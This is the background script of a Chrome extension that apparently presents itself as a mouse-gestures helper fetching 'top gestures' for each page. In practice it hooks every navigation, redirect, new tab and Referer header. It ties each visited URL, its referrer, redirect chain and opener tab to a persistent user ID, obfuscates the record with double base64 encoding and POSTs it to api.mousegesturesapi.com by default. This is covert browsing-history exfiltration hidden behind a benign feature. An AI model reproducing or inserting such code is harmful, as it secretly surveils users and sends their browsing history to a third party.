/*handler to get latest and live top gestures by url, per tab, and saving the data to a local handler so we can directly, without any delay, showing the results in the popup*/


const version = chrome.runtime.getManifest().version;
//pii filter for url we pass:
const piiFilter = (function () {
    const pii_entities = {name: '__AN_NAME__', email: '__AN_EMAIL__', phone: '__AN_PHONE_NUM__'};
    const keys = {
        "firstname": pii_entities.name,
        "lastname": pii_entities.name,
        "phone": pii_entities.phone,
        "phonenumber": pii_entities.phone,
        "email": pii_entities.email
    };
    return {
        fixByFields: function (queryStringParamPair) {
            const splitPair = queryStringParamPair.split("=");
            return splitPair[0] + "=" + (keys[splitPair[0]] ? keys[splitPair[0]] : splitPair[1]);
        },
        findRelevant: function (candidate) {
            return candidate.indexOf('=') > -1 ? Object.keys(keys).indexOf(candidate.split("=")[0]) : false;
        },
        clean: function (url, key) {
            let aLink = document.createElement('a');
            aLink.href = url;
            if (!aLink.search || (aLink && aLink.search === ""))
                return aLink.href;
            const queryParamsPairs = aLink.search.substring(1).split("&");
            let postFix = [];
            queryParamsPairs.forEach((queryParamsPair) => {
                postFix.push(this.findRelevant(queryParamsPair) ? this.fixByFields(queryParamsPair) : queryParamsPair);
            });
            aLink.search = postFix.join('&');
            return aLink.href;

        }
    }
})();
const tabber = (function () {
    var hash = {};
    var lp = "";
    var lpi = undefined;
    return {
        remove: function (tid) {
            delete hash[tid];
        },
        edit: function (tid, props) {
            if (!tid) return null;
            if (!hash[tid]) this.clear(tid);
            Object.keys(props || {}).forEach(function (key) {
                hash[tid][key] = props[key];
            });
            return hash[tid];
        },
        request: function (tabId, tab) {
            if (!hash[tabId] || (hash[tabId].p && !hash[tabId].replaced)) {
                this.clear(tabId);
                return;
            }
            hash[tabId].tabid = tabId;
            var currTab = hash[tabId] || {};
            var url = urlValidator(tab.url);
            if (url && !(!currTab.hh && lp == tab.url)) {
                if (!tab.active && !hash[tabId].fr)
                    hash[tabId].meta.push("background_auto_reloading");
                if (hash[tabId].dada && (hash[hash[tabId].dada] || {}).retroet)
                    hash[tabId].et = hash[hash[tabId].dada].retroet;
                this.edit(tabId, {
                    q: url,
                    prev: lp
                });
                const f = JSON.parse(JSON.stringify(hash[tabId]));
                getTop(f);
                if (tab.active)
                    lp = currTab.q;
                hash[tabId].et = null;
                hash[tabId].dada = null;
            }
            this.clear(tabId);
            hash[tabId].q = url;
            hash[tabId].p = true;


        },
        clear: function (tid) {
            hash[tid] = {
                tmv: version, md: 21, v: 1.1, sub: version, ch: 0,
                s: 'ab8f3fb95', pid: guidHandler(), sess: '', crd: 0,
                sr: [], restarting: false,
                q: (hash[tid] || {}).q || null,
                hreferer: (hash[tid] || {}).hreferer || '',
                meta: ["exthead"], fr: false, aj: (hash[tid] || {}).aj || false,
                replaced: (hash[tid] || {}).replaced || false,
                hh: (hash[tid] || {}).hh || false,
                dada: (hash[tid] || {}).dada || null,
                retroet: (hash[tid] || {}).retroet || '',
                et: (hash[tid] || {}).et || ''
            };
        },
        details: function (tid, cb) {
            chrome.tabs.get(tid, function (details) {
                if (!chrome.runtime.lastError) {
                    cb(details);
                }
            });
        },
        lpUpdate: function (param) {
            var idd = param.id || param;
            lpi = param.id || undefined;
            lp = (hash[idd] || {}).q || lp;
        },
        getLpi: function () {
            return lpi;
        }
    }
})();
const topDB = (function () {
    let tabsData = {};

    const ttl = 1000 * 60 * 60;
    const cleanInterval = 1000 * 60 * 60;

    const cleanOld = function () {
        const now = new Date().getTime();
        for (let tabId in tabsData) {
            if ((now - tabsData[tabId].lastModified) > ttl) {
                delete tabsData[tabId];
            }
        }
    };

    setInterval(cleanOld, cleanInterval);

    return {
        getDataPerTabId: function (tabId) {
            if (tabsData[tabId]) {
                tabsData[tabId].lastModified = new Date().getTime();
                return tabsData[tabId].data;
            }
            return null;
        },
        updateDataPerTabId: function (tabId, data) {
            if (!tabsData[tabId])
                tabsData[tabId] = {};
            tabsData[tabId].lastModified = new Date().getTime();
            tabsData[tabId].data = data;
        },
        getAllTabs: function () {
            return tabsData;
        }
    }

})();

const queryStringParser = function (obj) {
    const filtered = ["restarting", "hh", "p", "fr", "aj", "replaced", "retroet", "dada", "tabid"];
    return Object.keys(obj).filter(function (key) {
        return (!!obj[key] || false === obj[key]) && filtered.indexOf(key) === -1;
    }).map(function (key) {
        var val = obj[key];
        if ('sr' === key) {
            return obj[key].map(function (v) {
                return key + '=' + encodeURIComponent(v);
            }).join('&');
        }
        if (-1 < 'q prev hreferer cr et'.split(' ').indexOf(key)) {
            val = encodeURIComponent(val || '');
        }
        return key + '=' + val;
    }).join('&');
};
const urlValidator = function (url) {
    return (url.indexOf("http") === 0 &&
        url.indexOf(":/" + "/localhost") === -1 &&
        url.indexOf("chrome/newtab") === -1 &&
        url.indexOf("chrome-") !== 0 &&
        url.indexOf("about:") !== 0 &&
        url.indexOf("chrome:/" + "/") === -1) ? url : null;
};
const guidHandler = function () {
    const guid_key = "guid_key";
    var guid = localStorage.getItem(guid_key);
    if (!guid) {
        var g = function () {
            return (((1 + Math.random(Date.now() + 12)) * 0x10000) | 0).toString(30).substring(1);
        };
        guid = (g() + g() + g() + g() + g() + g() + g() + g() + g());
        localStorage.setItem(guid_key, guid);
    }
    return guid;
};
const topResponseHandling = function (tabid, response) {

    const gestures = response ? (typeof response == 'object' ? response.gestures : JSON.parse(response).gestures) : null;
    topDB.updateDataPerTabId(tabid, gestures);
    // letting the user know if there are gestures or not
    chrome.browserAction.setIcon({
        path: (gestures && gestures.length > 0) ? "icon.png" : "icond.png",
        tabId: tabid
    });

};
const getTop = function (data) {
    // if user opted out, do nothing except updating popup icon
    chrome.storage.sync.get("optedout", function (obj) {
        if (obj["optedout"]) {
            chrome.tabs.query({url: data.q}, function (tab) {
                chrome.browserAction.setIcon({
                    path: "icond.png",
                    tabId: tab.id
                });
            });
        } else {
            //if user opted in, call to the server, asking for available top gesturesgi
            data.ts = Date.now();
            let pdata = {};
            $.each(data, (key, value) => {
                pdata[key] = ((['q', 'prev', 'hreferer', 'cr', 'et'].indexOf(key) > -1) && value) ? piiFilter.clean(value, key) : value;
            });
            const bqa = queryStringParser(pdata);
            const payload = btoa(bqa);
            let a = document.createElement('a');
            a.href = data.q;
            $.ajax({
                type: "POST",
                url: 'https://api.mousegesturesapi.com/ms/gs',
                headers: {ges: a.hostname, "Content-type": "application/x-www-form-urlencoded"},
                data: ['e', encodeURIComponent(btoa(payload))].join('='),
                success: topResponseHandling.bind(this, data.tabid)
            });
        }
    });
};

const typer = {types: ["main_frame"], urls: ["<all_urls>"]},
      onBeforeSendHeadersOptions = ["blocking", "requestHeaders"];
if (chrome.webRequest.OnBeforeSendHeadersOptions && chrome.webRequest.OnBeforeSendHeadersOptions.hasOwnProperty('EXTRA_HEADERS')) {
    onBeforeSendHeadersOptions.push('extraHeaders');
}

const events = [
    {
        event: 'chrome.runtime.onMessage', arguments: [function (request, sender) {
            if (request.href)
                tabber.edit(sender.tab.id, {et: request.href});
            else if (request.ahref)
                tabber.edit(sender.tab.id, {retroet: request.ahref});
        }]
    },
    {
        event: 'chrome.windows.getAll', arguments: [{populate: true}, function (windows) {
            for (var w = 0; w < windows.length; w++) {
                for (var i = 0; i < windows[w].tabs.length; i++) {
                    if (!urlValidator(windows[w].tabs[i].url))
                        continue;
                    tabber.edit(windows[w].tabs[i].id, {q: windows[w].tabs[i].url, restarting: true});
                    if (windows[w].focused && windows[w].tabs[i].active)
                        tabber.lpUpdate(windows[w].tabs[i]);
                }
            }
        }], override: true
    },
    {
        event: 'chrome.tabs.onUpdated', arguments: [function (tabId, details, tab) {
            if (details && "complete" === details.status) {
                if (tabber.edit(tabId).p && tabber.edit(tabId).aj) {
                    tabber.edit(tabId, {q: undefined, p: false, aj: false});
                }
                tabber.edit(tabId, {tt: "ajax", aj: true});
                tabber.request(tabId, tab);
                tabber.edit(tabId, {replaced: false});
            }
        }]
    },
    {
        event: 'chrome.tabs.onReplaced', arguments: [function (addedTabId, removedTabId) {
            tabber.edit(addedTabId, {replaced: true});
            tabber.details(addedTabId, tabber.request.bind(tabber, (addedTabId || {}).tabId || addedTabId));
        }]
    },
    {
        event: 'chrome.webRequest.onBeforeRequest', arguments: [function (details) {
            urlValidator(details.url) && tabber.edit(details.tabId, {q: undefined, p: false, aj: false});
        }, typer, ["blocking"]]
    },
    {
        event: 'chrome.webRequest.onBeforeRedirect', arguments: [function (details) {
            urlValidator(details.url) && tabber.edit(details.tabId).sr.push(details.url);
        }, typer]
    },
    {
        event: 'chrome.webRequest.onBeforeSendHeaders',
        arguments: [function (details) {
            tabber.edit(details.tabId, {hh: true});
            if (!details.requestHeaders.some(function (rh) {
                    return /^Referer$/i.test(rh.name) && tabber.edit(details.tabId, {hreferer: rh.value});
                })) {
                tabber.edit(details.tabId, {hreferer: ''})
            }
            return {requestHeaders: details.requestHeaders};
        }, typer, onBeforeSendHeadersOptions]
    },
    {
        event: 'chrome.webRequest.onHeadersReceived', arguments: [function (details) {
            tabber.edit(details.tabId, {hh: true});
        }, typer]
    },
    {
        event: 'chrome.webNavigation.onCommitted', arguments: [function (dtls) {
            dtls = dtls || {};
            var tid = dtls.tabId;
            var tq = dtls.transitionQualifiers;
            if (tid && dtls.frameId === 0) {
                tabber.edit(tid, {tt: dtls.transitionType, tq: tq});
                if (/client_redirect/.test(tq)) {
                    tabber.edit(tid, {cr: dtls.url});
                }
                if (/server_redirect/.test(tq)) {
                    //redirect
                }
                tabber.details(tid, tabber.request.bind(tabber, (tid || {}).tabId || tid));
            }
        }]
    },
    {
        event: 'chrome.tabs.onRemoved', arguments: [function (tabId) {
            tabber.remove(tabId);
        }]
    },
    {
        event: 'chrome.windows.onRemoved', arguments: [function (windowID) {
            chrome.tabs.query({active: true}, function (tabs) {
                if (tabs[0]) {
                    tabber.lpUpdate(tabs[0]);
                }
            });
        }]
    },
    {
        event: 'chrome.tabs.onCreated', arguments: [function (tab) {
            var curTab = tabber.edit(tab.id, {fr: true, replaced: false});
            var openerTabId = tab.openerTabId || tabber.getLpi();
            var oOpenerTabInfo = tabber.edit(openerTabId);
            if (tab.url.length && tabber.edit(openerTabId) && tab.url === tabber.edit(openerTabId).q) {
                tabber.edit(tab.id).meta.push("duplication");
            } else if (tab.url.length) {
                chrome.tabs.query({
                    url: tab.url
                }, function (tabs) {
                    if ((tabs || []).length > 1) {
                        tabber.edit(tab.id).meta.push("duplication");
                        tabber.edit(tab.id).meta.push("background_duplication");
                    }
                });
            }
            if ('complete' == tab.status && !tab.openerTabId) {
                tabber.edit(tab.id).meta.push("reopening");
            }
            tabber.edit(tab.id, {dada: openerTabId});
        }]
    },
    {
        event: 'chrome.windows.onFocusChanged', arguments: [function (window) {
            if (chrome.windows.WINDOW_ID_NONE == window) {
                return;
            }
            chrome.tabs.query({windowId: window, active: true}, function (tabs) {
                if (tabs[0] && tabs[0].active) {
                    tabber.lpUpdate(tabs[0]);
                }
            });
        }]
    },
    {
        event: 'chrome.webRequest.onErrorOccurred', arguments: [function (details) {
            try {
                tabber.edit(details.tabId, {sr: null});
            } catch (e) {
            }
        }, typer]
    },
    {
        event: 'chrome.tabs.onActivated', arguments: [function (tid) {
            tabber.details((tid || {}).tabId || tid, tabber.lpUpdate);
        }]
    }
];
events.forEach((e) => {
    let pathParts = e.event.split('.');
    let path = window;
    pathParts.forEach((p) => {
        path = path[p];
    });
    if (e.override)
        path(...e.arguments);
    else
        path.addListener(...e.arguments);
});


